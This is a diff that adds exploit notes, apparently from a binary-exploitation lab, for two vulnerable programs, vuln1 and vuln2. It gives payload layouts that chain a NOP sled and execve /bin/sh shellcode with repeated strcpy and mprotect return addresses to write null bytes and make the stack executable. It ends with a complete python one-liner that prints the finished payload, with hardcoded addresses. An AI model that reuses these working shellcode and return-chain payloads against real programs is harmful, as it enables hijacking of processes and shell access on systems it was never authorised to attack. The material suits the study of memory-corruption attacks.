@@ -10,3 +10,26 @@ NOP * 203 + shellcode (25 bytes) + mprotect_address * 10 + address of "pop pop p
 
 
 The vuln1.c has a for loop which replaces 0x7f with 0x00
+
+
+vuln1
+---------
+
+NOP * 203 + shellcode (25 bytes) + esp_plus_8_addr + mprotect_address * 10 + address of "pop pop pop ret" + encoded_aligned_page_address
++ encoded_mprotect_length + encoded_privileges_mprotect + address_of_shellcode
+
+
+vuln2
+------
+NOP * 199 + shellcode (25 bytes) + 10 * addr of strcpy + addr of "pop pop ret" + addr of dest byte to set null_1 + addr of src null byte +
+addr of strcpy + addr of "pop pop ret" + addr of dest byte to set null_2 + addr of src null byte + ...... +
+addr of strcpy + addr of "pop pop ret" + addr of dest byte to set null_7 + addr of src null byte +
+encoded_aligned_page_address + encoded_mprotect_length + encoded_privileges_mprotect + address_of_shellcode
+
+
+`python -c 'print "\x90"*199 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x30\x8a\xe9\xb7"*10 + "\x34\x0e\xe3\xb7" + "\x14\xef\xff\xbf" + "\xd0\xf0\xff\xbf" + "\x30\x8a\xe9\xb7" + "\x34\x0e\xe3\xb7" + "\x18\xef\xff\xbf" + "\xd0\xf0\xff\xbf" + "\x30\x8a\xe9\xb7" + "\x34\x0e\xe3\xb7" + "\x1a\xef\xff\xbf" + "\xd0\xf0\xff\xbf" + "\x30\x8a\xe9\xb7" + "\x34\x0e\xe3\xb7" + "\x1b\xef\xff\xbf" + "\xd0\xf0\xff\xbf" + "\x30\x8a\xe9\xb7" + "\x34\x0e\xe3\xb7" + "\x1d\xef\xff\xbf" + "\xd0\xf0\xff\xbf" + "\x30\x8a\xe9\xb7" + "\x34\x0e\xe3\xb7" + "\x1e\xef\xff\xbf" + "\xd0\xf0\xff\xbf" + "\x30\x8a\xe9\xb7" + "\x34\x0e\xe3\xb7" + "\x1f\xef\xff\xbf" + "\xd0\xf0\xff\xbf" + "\x50\x44\xef\xb7"  + "\x33\x0e\xe3\xb7" + "\x7f\xe0\xff\xbf" + "\x7f\x10\x7f\x7f" + "\x07\x7f\x7f\x7f" + "\xa0\xed\xff\xbf"'`
+
+
+
+
+
